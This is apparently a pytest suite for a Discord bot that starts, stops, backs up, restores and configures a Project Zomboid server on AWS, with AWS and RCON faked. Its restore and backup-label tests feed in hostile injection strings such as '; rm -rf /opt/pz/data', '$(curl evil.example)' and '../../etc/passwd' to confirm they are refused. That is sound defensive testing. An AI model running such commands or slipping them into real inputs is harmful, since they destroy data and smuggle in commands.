"""The state machine and the operations, with AWS and RCON faked out.

The tests that matter most here are the negative ones. A bot that starts a server
correctly but fails to clean up after a *failed* start leaves an m7i.xlarge billing at
$0.20/hour with nobody watching, and that is the failure this whole design exists to
prevent.
"""

from __future__ import annotations

import asyncio

import pytest

from conftest import FakeRcon, backup, noop_progress
from pzbot.rcon import RconAuthError, RconUnreachable
from pzbot.server import OperationError, Stage


def fast_forward(monkeypatch):
    """Make every `asyncio.sleep` return immediately, so a 120s grace period costs 0s."""
    real_sleep = asyncio.sleep
    monkeypatch.setattr(asyncio, "sleep", lambda *_: real_sleep(0))


# --- Probing ---------------------------------------------------------------------------


async def test_stopped_instance_is_stopped_and_costs_no_rcon_call(server, aws):
    aws.state = "stopped"
    snap = await server.probe()
    assert snap.stage is Stage.STOPPED
    assert server.rcon.commands == []


async def test_running_and_answering_is_ready(server, aws):
    aws.state = "running"
    server.rcon.players = ["Bob", "Alice"]
    snap = await server.probe()
    assert snap.stage is Stage.READY
    assert snap.players == ["Bob", "Alice"]
    assert snap.player_count == 2


async def test_running_but_silent_is_booting_not_ready(server, aws):
    # The single most important distinction in the bot: EC2 says running, PZ is still
    # loading the world, and nobody should be told to connect yet.
    aws.state = "running"
    server.rcon.fail = RconUnreachable("connection refused")
    snap = await server.probe()
    assert snap.stage is Stage.BOOTING
    assert snap.rcon_error


async def test_a_rejected_password_is_not_reported_as_still_loading(server, aws):
    # Reporting an auth failure as "loading" would hide a stale password behind a
    # ten-minute timeout, and then stop a perfectly healthy server.
    aws.state = "running"
    server.rcon.fail = RconAuthError("RCON authentication failed")
    snap = await server.probe()
    assert snap.stage is Stage.UNKNOWN
    assert "authentication" in snap.rcon_error


async def test_a_well_formed_but_wrong_response_is_not_ready(server, aws):
    aws.state = "running"

    class Odd(FakeRcon):
        async def execute(self, command, *, timeout=None):
            return "Unknown command"

    server.rcon = Odd()
    assert (await server.probe()).stage is Stage.BOOTING


async def test_probe_follows_a_moved_private_ip(server, aws):
    aws.state = "running"
    server.rcon.host = "10.20.1.9"  # stale, e.g. after the instance was rebuilt
    await server.probe()
    assert server.rcon.host == "10.20.1.171"


# --- Start -----------------------------------------------------------------------------


async def test_start_from_stopped_reaches_ready(server, aws):
    aws.state = "stopped"
    snap = await server.start(noop_progress)
    assert snap.stage is Stage.READY
    assert f"start:{server.cfg.game_instance_id}" in aws.calls


async def test_start_when_already_ready_does_not_start_again(server, aws):
    aws.state = "running"
    await server.start(noop_progress)
    assert not [c for c in aws.calls if c.startswith("start:")]


async def test_start_during_a_shutdown_is_refused(server, aws):
    # Starting on top of a stop races the save that is in progress.
    aws.state = "stopping"
    with pytest.raises(OperationError, match="shutting down"):
        await server.start(noop_progress)
    assert not [c for c in aws.calls if c.startswith("start:")]


async def test_a_world_that_never_loads_stops_the_instance(server, aws):
    aws.state = "stopped"
    server.cfg.start_ready_timeout = -1  # the world is already "late" on the first poll
    server.rcon.fail = RconUnreachable("connection refused")

    with pytest.raises(OperationError, match="never answered RCON"):
        await server.start(noop_progress)
    assert f"stop:{server.cfg.game_instance_id}" in aws.calls


async def test_an_instance_that_never_boots_stops_itself(server, aws):
    class NeverRuns(type(aws)):
        async def start_instance(self, instance_id):
            self.calls.append(f"start:{instance_id}")
            return "pending"  # and the state stays "stopped" forever

    stuck = NeverRuns("stopped")
    server.aws = stuck
    server.cfg.start_running_timeout = -1

    with pytest.raises(OperationError, match="still `stopped`"):
        await server.start(noop_progress)
    assert f"stop:{server.cfg.game_instance_id}" in stuck.calls


async def test_a_rejected_password_during_start_stops_the_instance(server, aws):
    aws.state = "stopped"
    server.rcon.fail = RconAuthError("RCON authentication failed")
    with pytest.raises(OperationError, match="refused the bot's password"):
        await server.start(noop_progress)
    assert f"stop:{server.cfg.game_instance_id}" in aws.calls


# --- Stop ------------------------------------------------------------------------------


async def test_stop_backs_up_before_stopping(server, aws):
    aws.state = "running"
    await server.stop(noop_progress)
    assert aws.shell == [["/opt/pz/bin/pz-backup.sh prestop pzbot"]]
    assert aws.calls.index("shell:pzbot /pz stop") < aws.calls.index("stop:i-0test")


async def test_stop_still_stops_when_the_backup_fails(server, aws):
    # ExecStop saves the world on the way down regardless (pzserver DESIGN G5). Refusing
    # to stop here would leave an expensive instance up because of a broken script.
    from pzbot.aws import CommandResult

    aws.state = "running"
    aws.shell_result = CommandResult("Failed", "", "tar: no space left on device")
    await server.stop(noop_progress)
    assert f"stop:{server.cfg.game_instance_id}" in aws.calls


async def test_stop_warns_players_before_shutting_down(server, aws, monkeypatch):
    fast_forward(monkeypatch)
    aws.state = "running"
    server.cfg.stop_grace_seconds = 120
    server.rcon.players = ["Bob"]

    await server.stop(noop_progress)
    warnings = [c for c in server.rcon.commands if c.startswith("servermsg")]
    assert len(warnings) == 2  # one at the start of the grace period, one near the end


async def test_force_stop_skips_the_warning_but_not_the_backup(server, aws, monkeypatch):
    fast_forward(monkeypatch)
    aws.state = "running"
    server.cfg.stop_grace_seconds = 120
    server.rcon.players = ["Bob"]

    await server.stop(noop_progress, force=True)
    assert not [c for c in server.rcon.commands if c.startswith("servermsg")]
    assert aws.shell == [["/opt/pz/bin/pz-backup.sh prestop pzbot"]]


async def test_stopping_an_already_stopped_server_is_refused(server, aws):
    aws.state = "stopped"
    with pytest.raises(OperationError, match="already stopped"):
        await server.stop(noop_progress)


# --- Restore ---------------------------------------------------------------------------


GOOD = "2026-08-22T19-24-30Z__scheduled.tar.zst"


async def test_restore_refuses_a_name_that_is_not_a_backup_name(server, aws):
    # The value reaching this function comes from a Discord text box. It must never be
    # able to become a second shell command.
    aws.state = "running"
    for hostile in (
        "; rm -rf /opt/pz/data",
        "$(curl evil.example)",
        "../../etc/passwd",
        f"{GOOD} && reboot",
    ):
        with pytest.raises(OperationError, match="not a backup name"):
            await server.restore(hostile, noop_progress)
    assert aws.shell == []


async def test_restore_refuses_a_name_that_is_not_in_the_bucket(server, aws):
    aws.state = "running"
    aws.backups = [backup("2026-08-01T00-00-00Z__manual.tar.zst")]
    with pytest.raises(OperationError, match="No backup named"):
        await server.restore(GOOD, noop_progress)
    assert aws.shell == []


async def test_restore_refuses_while_players_are_online(server, aws):
    aws.state = "running"
    aws.backups = [backup(GOOD)]
    server.rcon.players = ["Bob"]
    with pytest.raises(OperationError, match="player"):
        await server.restore(GOOD, noop_progress)
    assert aws.shell == []


async def test_restore_refuses_while_the_instance_is_stopped(server, aws):
    aws.state = "stopped"
    aws.backups = [backup(GOOD)]
    with pytest.raises(OperationError, match="must be running"):
        await server.restore(GOOD, noop_progress)


async def test_restore_stops_the_game_restores_and_starts_it_again(server, aws):
    aws.state = "running"
    aws.backups = [backup(GOOD)]
    await server.restore(GOOD, noop_progress)
    assert aws.shell == [
        ["systemctl stop pzserver.service"],
        [f"/opt/pz/bin/pz-restore.sh {GOOD} --yes"],
        ["systemctl start pzserver.service"],
    ]


# --- Backups ---------------------------------------------------------------------------


async def test_backup_label_must_be_boring(server, aws):
    aws.state = "running"
    with pytest.raises(OperationError, match="letters, numbers"):
        await server.backup_now("no; rm -rf /")
    assert aws.shell == []


async def test_backup_label_is_passed_through_when_sane(server, aws):
    aws.state = "running"
    await server.backup_now("before-b42")
    assert aws.shell == [["/opt/pz/bin/pz-backup.sh manual before-b42"]]


# --- Config allowlist ------------------------------------------------------------------


async def test_config_rejects_a_key_that_is_not_on_the_allowlist(server, aws):
    aws.state = "running"
    with pytest.raises(OperationError, match="not an editable key"):
        await server.ini_write("RCONPassword", "hunter2")
    assert aws.shell == []


async def test_config_validates_values(server, aws):
    aws.state = "running"
    with pytest.raises(OperationError, match="between 1 and 64"):
        await server.ini_write("MaxPlayers", "9000")
    with pytest.raises(OperationError, match="not true or false"):
        await server.ini_write("PVP", "maybe")
    with pytest.raises(OperationError, match="control characters"):
        await server.ini_write("PublicName", "a=b")


async def test_config_writes_and_reloads(server, aws):
    aws.state = "running"
    message = await server.ini_write("PVP", "yes")
    assert "reloadoptions" in server.rcon.commands
    assert "`true`" in message


# --- Idle ------------------------------------------------------------------------------


async def test_idle_timeout_bounds_are_enforced(server, aws):
    for bad in (0, 4, 1441):
        with pytest.raises(OperationError, match="between 5 and 1440"):
            await server.set_idle(bad, bad - 5)
    assert aws.shell == []


async def test_idle_never_writes_a_zero_timeout(server, aws):
    # PZ's watchdog compares `idle >= IDLE_TIMEOUT`, so a zero would shut the server
    # down on the first tick, sixty seconds after someone asked for "no idle timeout".
    await server.set_idle(30, -5)
    written = "\n".join(aws.shell[0])
    assert "PZ_IDLE_TIMEOUT_MIN=30" in written
    assert "PZ_IDLE_WARN_MIN=1" in written
    assert "PZ_IDLE_WARN_MIN=0" not in written


def test_the_backup_name_pattern_matches_what_the_live_stack_actually_produces():
    # Copied verbatim from `aws s3 ls` against pz-prod-backups-020949219706. The pattern
    # is a security control on the restore path, so it has to match reality exactly --
    # too strict and `/pz restore` refuses every real backup.
    from pzbot.server import BACKUP_NAME

    for name in (
        "2026-08-23T00-22-27Z__prestop__idle-for-30m.tar.zst",
        "2026-08-23T00-00-36Z__scheduled.tar.zst",
        "2026-08-22T23-47-22Z__manual__first-verification.tar.zst",
    ):
        assert BACKUP_NAME.fullmatch(name), name


# --- Sandbox options ---------------------------------------------------------------------


async def test_setting_a_sandbox_option_stops_the_game_edits_then_starts_it(server, aws):
    # Order matters and is the whole reason this is not "edit, then restart": a running
    # server owns SandboxVars.lua and rewrites it wholesale when an admin changes an
    # option in game, which would silently undo an edit made underneath it.
    aws.state = "running"
    changed = await server.sandbox_set("ZombieLore.Transmission", "Saliva only", noop_progress)

    assert [c for c in aws.calls if c.startswith("shell:")] == [
        "shell:pzbot /pz sandbox set (stop)",
        "shell:pzbot /pz sandbox set",
        "shell:pzbot /pz sandbox set (start)",
    ]
    assert aws.shell[0] == ["systemctl stop pzserver.service"]
    assert aws.shell[2] == ["systemctl start pzserver.service"]
    assert changed["applied"] == "yes"


async def test_the_label_is_translated_to_the_number_the_game_reads(server, aws):
    aws.state = "running"
    await server.sandbox_set("ZombieLore.Transmission", "Saliva only", noop_progress)
    # argv is plain at the end of the shipped command: `… python3 - set <file> <path> <value>`
    assert aws.python[0].endswith(
        "set /opt/pz/data/Zomboid/Server/pzprod_SandboxVars.lua ZombieLore.Transmission 2"
    )


async def test_apply_off_leaves_the_server_alone(server, aws):
    # The batching workflow: change several settings, restart once.
    aws.state = "running"
    changed = await server.sandbox_set("DayLength", "2 hours", noop_progress, apply=False)
    assert [c for c in aws.calls if c.startswith("shell:")] == ["shell:pzbot /pz sandbox set"]
    assert changed["applied"] == "next start"


async def test_a_failed_edit_puts_the_server_back_up(server, aws):
    # Otherwise the instance bills at $0.20/hour with no game on it, which is the worst
    # of both worlds.
    from pzbot.aws import CommandResult

    aws.state = "running"
    aws.python_result = CommandResult(
        "Failed", "", "sandbox: DayLength is not in this world's file"
    )
    with pytest.raises(OperationError, match="Could not change the sandbox options"):
        await server.sandbox_set("DayLength", "2 hours", noop_progress)
    assert aws.shell[-1] == ["systemctl start pzserver.service"]


async def test_a_bad_value_never_touches_the_server(server, aws):
    aws.state = "running"
    with pytest.raises(OperationError, match="Blood"):
        await server.sandbox_set("ZombieLore.Transmission", "by sneezing", noop_progress)
    with pytest.raises(OperationError, match="between 0 and 4"):
        await server.sandbox_set("ZombieConfig.PopulationMultiplier", "99", noop_progress)
    with pytest.raises(OperationError, match="not a setting"):
        await server.sandbox_set("ZombieLore.RCONPassword", "1", noop_progress)
    assert aws.shell == []


async def test_sandbox_needs_the_instance_running(server, aws):
    aws.state = "stopped"
    with pytest.raises(OperationError, match="instance is stopped"):
        await server.sandbox_set("DayLength", "2 hours", noop_progress)
    assert aws.shell == []


async def test_sandbox_read_parses_the_json_the_box_returns(server, aws):
    from pzbot.aws import CommandResult

    aws.state = "running"
    aws.python_result = CommandResult("Success", '{"DayLength": "3"}', "")
    assert await server.sandbox_read() == {"DayLength": "3"}


@pytest.mark.parametrize(
    "operation",
    [
        lambda s: s.sandbox_read(),
        lambda s: s.ini_read(),
        lambda s: s.sandbox_set("DayLength", "2 hours", noop_progress),
        lambda s: s.ini_write("PVP", "true"),
    ],
)
async def test_reaching_the_box_while_it_is_off_explains_itself(server, aws, operation):
    # SSM's own answer to this is "InvalidInstanceId", which tells a player nothing.
    aws.state = "stopped"
    with pytest.raises(OperationError, match="instance is stopped"):
        await operation(server)
    assert aws.shell == []
